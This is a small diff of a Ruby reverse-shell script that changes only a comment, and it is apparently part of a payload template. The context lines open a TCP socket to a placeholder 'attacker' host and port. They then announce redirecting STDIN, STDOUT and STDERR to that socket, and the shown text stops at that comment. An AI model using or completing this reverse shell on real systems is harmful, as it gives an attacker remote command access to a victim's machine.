@@ -1,6 +1,6 @@
 require "socket"
 
-# Open a new socket and connect to the attacker
+# Open a new TCP socket and connect to the attacker
 sock = TCPSocket.new("*\host*", *\port*)
 
 # Redirect STDIN, STDOUT, and STDERR to the socket
